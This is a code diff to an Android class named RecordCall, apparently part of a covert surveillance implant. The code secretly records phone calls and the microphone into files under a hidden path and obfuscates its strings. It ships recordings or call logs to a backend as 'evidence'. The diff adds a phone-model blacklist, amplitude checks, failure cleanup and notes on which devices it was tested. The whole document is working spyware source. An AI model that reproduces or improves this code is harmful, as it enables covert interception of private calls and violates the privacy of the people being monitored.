@@ -17,11 +17,14 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
+import android.os.Build;
 /*
  * Tested :
  * - 4.0.4 Galaxy nexus maguro -> Doesn't record gsm calls
  * - 4.2.2 LG-D802 -> Successfully recorded gsm calls
- * - 4.4.2 (ART runtime )LG-D405 -> Record microphone
+ * - 4.4.2 (ART runtime )LG-D405 -> recorder gsm calls
+ * - 4.3 Nexus 4 -> Doesn't record gsm calls
+ * - 4.2.2 Huawei P60  -> Record microphone
  */
 
 public class RecordCall implements OnErrorListener, OnInfoListener {
@@ -30,7 +33,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	static RecordCall singleton;
 	protected static final int CALL_PHONE = 0x0145;
 	private static int MAX_NUM_OF_FAILURE = 10;
-
+	protected static final String CALL_SUFFIX = M.e(".b");
 
 	private AutoFile onGoing_chunk;
 	private Call call;
@@ -38,6 +41,8 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	private boolean recorder_started=false;
 	private int try_source=0;
 	private int numFailures=0;
+	private String[] blacklistedPhones = {
+	};
 
 	public synchronized static RecordCall self() {
 		if (singleton == null) {
@@ -52,7 +57,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	private void createFile() {
 		if (onGoing_chunk == null) {
 			//onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + ".3gpp");
-			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + "");
+			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + CALL_SUFFIX);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createFile) new file: " + onGoing_chunk.getFile());//$NON-NLS-1$
 			}
@@ -116,6 +121,10 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 		try {
 			this.recorder.prepare();
 			this.recorder.start();
+			int ampl = recorder.getMaxAmplitude();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startRecord) recorder started ampl" + ampl);//$NON-NLS-1$
+			}
 			recorder_started = true;
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -124,6 +133,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 					Check.log(e);
 				}
 			}
+			deleteFile();
 			numFailures++;
 			return false;
 		}
@@ -167,8 +177,24 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 				numFailures += 1;
 			} else {
 				//String myNumber = Device.self().getPhoneNumber();
-				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete() ? call.getTimeEnd() : new Date(),
-						onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
+				/* 13/03/2015 In case duration is < 16second a CallInfo is sent instead , otherwise the backend will drop it
+				 * This will be fixed in the next release, we hope
+				 */
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence) saving");
+				}
+				if (call.getDuration() > 22 || call.isOngoing()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence) call.. onGoing"+ call.isOngoing());
+					}
+					ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete() ? call.getTimeEnd() : new Date(),
+							onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
+				}else{
+					ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isOffhook()?call.getDuration():0);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence) info");
+					}
+				}
 				//deleteFile();
 				//saveRecorderEvidence();
 			}
@@ -244,7 +270,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 		}
 		return true;
 	}
-	public void onInfo(MediaRecorder mr, int what, int extra) {
+	public synchronized void onInfo(MediaRecorder mr, int what, int extra) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
 		}
@@ -300,6 +326,21 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 			}
 			return false;
 		}
+		for ( String model: blacklistedPhones) {
+			if (Build.MODEL.equalsIgnoreCase(model)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (canRecordAndroid): Phone: " + Build.MODEL + " not supported");
+				}
+				return false;
+			}
+		}
 		return true;
+	}
+
+	public int getMaxAmplitude() {
+		if ( recorder != null ) {
+			return recorder.getMaxAmplitude();
+		}
+		return -1;
 	}
 }
